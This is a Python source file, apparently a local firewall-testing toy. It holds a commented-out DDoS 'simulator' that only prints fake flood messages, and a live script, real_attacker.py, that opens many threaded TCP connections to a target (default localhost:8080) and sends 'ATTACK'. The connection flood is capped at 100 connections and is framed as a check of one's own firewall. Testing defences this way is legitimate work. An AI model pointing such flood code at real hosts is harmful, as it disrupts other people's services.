# import threading
# import time
# import random
# import sys

# class RealTimeDDoSSimulator:
#     def __init__(self, target_ip="127.0.0.1", target_port=8080):
#         self.target_ip = target_ip
#         self.target_port = target_port
#         self.attack_running = False
        
#     def generate_random_ip(self):
#         return f"192.168.1.{random.randint(1, 255)}"
    
#     def simulate_connection(self, source_ip, protocol, connection_id):
#         try:
#             print(f"🔴 ATTACKING: {source_ip} -> {self.target_ip}:{self.target_port} [{protocol}] - Connection {connection_id}")
#             time.sleep(0.1)  # Simulate network delay
#             return True
#         except Exception as e:
#             print(f"❌ Attack failed: {e}")
#             return False
    
#     def syn_flood_attack(self, num_threads=25, duration=60):
#         print("💀 STARTING SYN FLOOD DDoS ATTACK")
#         print("=" * 50)
#         print(f"🎯 Target: {self.target_ip}:{self.target_port}")
#         print(f"🧵 Attack Threads: {num_threads}")
#         print(f"⏱️  Duration: {duration} seconds")
#         print("💥 Sending malicious packets...")
#         print("=" * 50)
        
#         self.attack_running = True
#         connection_count = 0
        
#         def attack_worker(worker_id):
#             nonlocal connection_count
#             while self.attack_running:
#                 source_ip = self.generate_random_ip()
#                 connection_count += 1
#                 self.simulate_connection(source_ip, "TCP-SYN", connection_count)
#                 time.sleep(0.05)  # Very fast for real attack simulation
        
#         # Start attack threads
#         threads = []
#         for i in range(num_threads):
#             t = threading.Thread(target=attack_worker, args=(i,))
#             threads.append(t)
#             t.start()
#             time.sleep(0.1)  # Stagger thread starts
        
#         # Run for duration
#         start_time = time.time()
#         while time.time() - start_time < duration and self.attack_running:
#             elapsed = int(time.time() - start_time)
#             if elapsed % 5 == 0:  # Progress every 5 seconds
#                 print(f"⏰ Attack in progress... {elapsed}s elapsed")
#             time.sleep(1)
        
#         self.attack_running = False
        
#         # Wait for threads to finish
#         for t in threads:
#             t.join()
            
#         print("=" * 50)
#         print("✅ DDoS attack simulation completed")
#         print(f"📊 Total connection attempts: {connection_count}")
    
#     def mixed_attack(self, num_threads=30, duration=45):
#         print("💀 STARTING MIXED DDoS ATTACK (SYN + UDP + ICMP)")
#         print("=" * 50)
#         print(f"🎯 Target: {self.target_ip}:{self.target_port}")
#         print(f"🧵 Attack Threads: {num_threads}")
#         print(f"⏱️  Duration: {duration} seconds")
#         print("💥 Sending multiple attack vectors...")
#         print("=" * 50)
        
#         self.attack_running = True
#         connection_count = 0
        
#         def mixed_worker(worker_id):
#             nonlocal connection_count
#             attack_types = ["TCP-SYN", "UDP-Flood", "ICMP-Flood", "HTTP-Flood"]
            
#             while self.attack_running:
#                 source_ip = self.generate_random_ip()
#                 attack_type = random.choice(attack_types)
#                 connection_count += 1
                
#                 if attack_type == "TCP-SYN":
#                     print(f"🔴 SYN Flood: {source_ip} -> {self.target_ip}:{self.target_port} - Packet {connection_count}")
#                 elif attack_type == "UDP-Flood":
#                     print(f"🔴 UDP Flood: {source_ip} -> {self.target_ip}:{random.randint(1,65535)} - Packet {connection_count}")
#                 elif attack_type == "ICMP-Flood":
#                     print(f"🔴 ICMP Flood: {source_ip} -> {self.target_ip} - Packet {connection_count}")
#                 else:
#                     print(f"🔴 HTTP Flood: {source_ip} -> {self.target_ip}:80 - Packet {connection_count}")
                
#                 time.sleep(0.03)  # Very fast mixed attack
        
#         threads = []
#         for i in range(num_threads):
#             t = threading.Thread(target=mixed_worker, args=(i,))
#             threads.append(t)
#             t.start()
        
#         start_time = time.time()
#         while time.time() - start_time < duration and self.attack_running:
#             elapsed = int(time.time() - start_time)
#             if elapsed % 5 == 0:
#                 print(f"⏰ Mixed attack ongoing... {elapsed}s - {connection_count} packets sent")
#             time.sleep(1)
        
#         self.attack_running = False
        
#         for t in threads:
#             t.join()
            
#         print("=" * 50)
#         print("✅ Mixed DDoS attack simulation completed")
#         print(f"📊 Total malicious packets: {connection_count}")

# def main():
#     if len(sys.argv) < 2:
#         print("Real-Time DDoS Attack Simulator")
#         print("=" * 40)
#         print("Usage: python real_time_ddos.py <attack_type>")
#         print("Attack types: syn, mixed")
#         print("Examples:")
#         print("  python real_time_ddos.py syn")
#         print("  python real_time_ddos.py mixed")
#         return
    
#     attack_type = sys.argv[1]
#     simulator = RealTimeDDoSSimulator()
    
#     try:
#         if attack_type == "syn":
#             simulator.syn_flood_attack(25, 60)  # 25 threads, 60 seconds
#         elif attack_type == "mixed":
#             simulator.mixed_attack(30, 45)  # 30 threads, 45 seconds
#         else:
#             print("Unknown attack type. Use 'syn' or 'mixed'")
#     except KeyboardInterrupt:
#         print("\n🛑 Attack stopped by user")
#         simulator.attack_running = False

# if __name__ == "__main__":
#     main()



# real_attacker.py
import socket
import threading
import time
import random
import sys

class RealAttacker:
    def __init__(self, target_ip="127.0.0.1", target_port=8080):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_running = False
        self.connections_made = 0
        
    def generate_ip(self):
        return f"192.168.1.{random.randint(1, 255)}"
    
    def real_connection_attack(self, num_threads=20, duration=30):
        print("💀 STARTING REAL DDoS ATTACK")
        print("=" * 50)
        print(f"🎯 Target: {self.target_ip}:{self.target_port}")
        print(f"🧵 Threads: {num_threads}")
        print(f"⏱️  Duration: {duration}s")
        print("🔴 Making REAL socket connections...")
        print("=" * 50)
        
        self.attack_running = True
        self.connections_made = 0
        
        def attack_worker(worker_id):
            while self.attack_running and self.connections_made < 100:
                try:
                    # Create REAL socket connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    
                    # This will actually trigger your firewall!
                    result = sock.connect_ex((self.target_ip, self.target_port))
                    
                    self.connections_made += 1
                    
                    if result == 0:
                        print(f"✅ Connection {self.connections_made}: SUCCESS")
                        sock.send(b"ATTACK")
                        response = sock.recv(1024)
                        print(f"   Server response: {response.decode()}")
                    else:
                        print(f"❌ Connection {self.connections_made}: FAILED (Blocked?)")
                    
                    sock.close()
                    time.sleep(0.1)  # Fast connections for DDoS
                    
                except Exception as e:
                    print(f"⚠️ Connection error: {e}")
                    time.sleep(0.2)
        
        # Start attack threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=attack_worker, args=(i,))
            threads.append(t)
            t.start()
            time.sleep(0.05)  # Stagger thread starts
        
        # Run for duration
        start_time = time.time()
        while time.time() - start_time < duration and self.attack_running:
            elapsed = int(time.time() - start_time)
            if elapsed % 5 == 0:
                print(f"⏰ Attack progress: {elapsed}s, {self.connections_made} connections")
            time.sleep(1)
        
        self.attack_running = False
        
        # Wait for threads
        for t in threads:
            t.join()
            
        print("=" * 50)
        print(f"✅ Attack completed: {self.connections_made} total connections")
        print("Check your firewall for DDoS blocking!")

def main():
    if len(sys.argv) > 1:
        threads = int(sys.argv[1])
    else:
        threads = 20
        
    attacker = RealAttacker()
    
    try:
        attacker.real_connection_attack(threads, 30)
    except KeyboardInterrupt:
        print("\n🛑 Attack stopped by user")
        attacker.attack_running = False

if __name__ == "__main__":
    main()